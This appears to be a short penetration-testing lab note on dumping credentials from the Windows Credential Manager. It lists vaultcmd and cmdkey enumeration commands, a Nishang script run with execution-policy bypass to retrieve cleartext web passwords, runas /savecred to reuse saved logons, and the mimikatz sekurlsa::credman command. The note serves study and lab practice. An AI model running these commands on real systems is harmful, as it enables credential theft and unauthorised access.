#runas #mimikatz #powershell #cmdkey #vaultcmd 
- Credential manager stores passwords for website, RDP logons etc.
- `vaultcmd` and `cmdkey` can be used to manage credentials in the credential manager.
```powershell
# list vauls, by default, "Web Credentials" and "Windows Credentails" are present
vaultcmd /list
vaultcmd /listproperties:"Web Credentials"
# list stored credentials
vaultcmd /listcreds:"Web Credentials"

# list keys
cmdkey /list
```
### Nishang
- Nishang's https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1 can be used to fetch cleartext web password from credential manager.
```powershell
powershell.exe -ex bypass
. .\Get-WebCredentials.ps1
Get-WebCredentials
```
### RunAs
- Runas.exe can be used to use the saved credentials.
```powershell
# list saved credentials
cmdkey /list

# runas can be used to use these credentials
runas.exe /savecred /user:thm.red\thm.local
```
### Mimikatz
- mimikatz can be used to fetch credentials from credential manager.
```powershell
sekurlsa::credman
```